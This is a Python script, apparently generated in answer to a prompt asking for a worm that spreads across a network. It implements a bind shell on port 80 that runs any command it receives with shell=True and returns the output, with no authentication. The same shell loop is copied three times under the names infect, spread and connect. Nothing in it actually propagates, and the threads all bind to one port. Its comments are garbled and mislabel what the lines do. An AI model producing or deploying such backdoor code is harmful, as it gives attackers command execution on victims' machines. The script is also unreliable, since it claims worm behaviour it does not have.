# create a worm that spreads to all the computers on the network

import socket
import os
import sys
import time
import threading
import subprocess

# global variables
host = ""  # ip address of the computer
port = 0  # port to connect to
data = ""  # function to infect other computers on the network
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create a socket
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # function to infect other computers on the network

# function to infect other computers on the network
def infect():
    global host  # ip address of the computer
    global port  # port to connect to
    global s  # function to infect other computers on the network
    global data  # function to infect other computers on the network
    # get the ip address of the computer
    host = socket.gethostbyname(socket.gethostname())  # function to infect other computers on the network
    # set the port to 80
    port = 80
    # create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # function to infect other computers on the network
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # function to infect other computers on the network
    # bind the socket to the port
    s.bind((host, port))
    # listen for connections
    s.listen(5)
    while True:
        # accept connections
        conn, addr = s.accept()
        # get the data from the connection
        data = conn.recv(1024)
        # decode the data
        data = data.decode("utf-8")
        # check if the data is a command
        if data[:2] == "cd":
            # change the directory
            os.chdir(data[3:])
        # check if the data is a command
        if len(data) > 0:
            # execute the command
            cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # get the output of the command
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            # decode the output
            output_str = str(output_bytes, "utf-8")
            # send the output to the client
            conn.send(str.encode(output_str + str(os.getcwd()) + "> "))
        # close the connection
        conn.close()

# function to spread to other computers on the network
def spread():
    global host
    global port
    global s
    global data
    # get the ip address of the computer
    host = socket.gethostbyname(socket.gethostname())
    # set the port to 80
    port = 80
    # create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # bind the socket to the port
    s.bind((host, port))
    # listen for connections
    s.listen(5)
    while True:
        # accept connections
        conn, addr = s.accept()
        # get the data from the connection
        data = conn.recv(1024)
        # decode the data
        data = data.decode("utf-8")
        # check if the data is a command
        if data[:2] == "cd":
            # change the directory
            os.chdir(data[3:])
        # check if the data is a command
        if len(data) > 0:
            # execute the command
            cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # get the output of the command
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            # decode the output
            output_str = str(output_bytes, "utf-8")
            # send the output to the client
            conn.send(str.encode(output_str + str(os.getcwd()) + "> "))
        # close the connection
        conn.close()

# function to connect to other computers on the network
def connect():
    global host
    global port
    global s
    global data
    # get the ip address of the computer
    host = socket.gethostbyname(socket.gethostname())
    # set the port to 80
    port = 80
    # create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # bind the socket to the port
    s.bind((host, port))
    # listen for connections
    s.listen(5)
    while True:
        # accept connections
        conn, addr = s.accept()
        # get the data from the connection
        data = conn.recv(1024)
        # decode the data
        data = data.decode("utf-8")
        # check if the data is a command
        if data[:2] == "cd":
            # change the directory
            os.chdir(data[3:])
        # check if the data is a command
        if len(data) > 0:
            # execute the command
            cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # get the output of the command
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            # decode the output
            output_str = str(output_bytes, "utf-8")
            # send the output to the client
            conn.send(str.encode(output_str + str(os.getcwd()) + "> "))
        # close the connection
        conn.close()

# function to start the worm
def start():
    # create a thread to infect other computers on the network
    t1 = threading.Thread(target=infect)
    # create a thread to spread to other computers on the network
    t2 = threading.Thread(target=spread)
    # create a thread to connect to other computers on the network
    t3 = threading.Thread(target=connect)
    # start the threads
    t1.start()
    t2.start()
    t3.start()

def main():
    # start the worm
    start()

if __name__ == "__main__":
    main()
